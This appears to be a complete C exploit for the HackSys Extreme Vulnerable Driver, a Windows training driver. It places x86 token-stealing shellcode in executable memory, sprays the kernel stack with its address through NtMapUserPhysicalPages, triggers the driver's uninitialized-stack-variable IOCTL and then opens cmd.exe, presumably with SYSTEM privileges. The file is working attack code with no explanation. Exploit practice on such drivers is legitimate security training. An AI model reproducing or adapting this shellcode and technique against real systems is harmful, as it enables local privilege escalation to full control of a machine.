#include "stdafx.h"
#include <Windows.h>
#include <string.h>
#include <stdio.h>
#include <winioctl.h>
#include <stdint.h>
#include <malloc.h>

int main()
{
	HANDLE dev = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		FILE_READ_ACCESS | FILE_WRITE_ACCESS,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (dev == INVALID_HANDLE_VALUE) {
		return 1;
	}

	char Buff[20] = "\xDD\xDD\xDD\xDD";
	DWORD outBytes = 0;
	
	typedef NTSTATUS(__stdcall *pfNtMapUserPhysicalPages)(
		PINT BaseAddress,
		UINT32 NumberOfPages,
		PBYTE PageFrameNumbers
	);

	pfNtMapUserPhysicalPages NtMapUserPhysicalPages = (pfNtMapUserPhysicalPages)GetProcAddress(
		GetModuleHandleW(L"ntdll.dll"), "NtMapUserPhysicalPages");

	char pl[60] =
		"\x60"
		"\x64\xA1\x24\x01\x00\x00"
		"\x8B\x40\x50"
		"\x89\xC1"
		"\x8B\x98\xF8\x00\x00\x00"
		"\xBA\x04\x00\x00\x00"
		"\x8B\x80\xB8\x00\x00\x00"
		"\x2D\xB8\x00\x00\x00"
		"\x39\x90\xB4\x00\x00\x00"
		"\x75\xED"
		"\x8B\x90\xF8\x00\x00\x00"
		"\x89\x91\xF8\x00\x00\x00"
		"\x61"
		"\x31\xC0"
		"\xC3"
		;
	LPVOID pla = VirtualAlloc(
		NULL,
		sizeof(pl),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	memcpy(pla, pl, sizeof(pl));
	LPVOID plAddress = &pla;
	char HeapSpray[0x1000] = { 0 };
	int BaseAddress = 0;
	for (int j = 0; j < 0x1000 / 4; j++) {
		memcpy(HeapSpray + (j*4), plAddress, 4);
	}

	NtMapUserPhysicalPages(&BaseAddress,1024,(PBYTE)&HeapSpray);

	DeviceIoControl(dev, 0x22202F, &Buff, sizeof(Buff), NULL, 0, &outBytes, (LPOVERLAPPED)NULL);
	system("cmd.exe");
	CloseHandle(dev);
	system("pause");
	return 0;
}
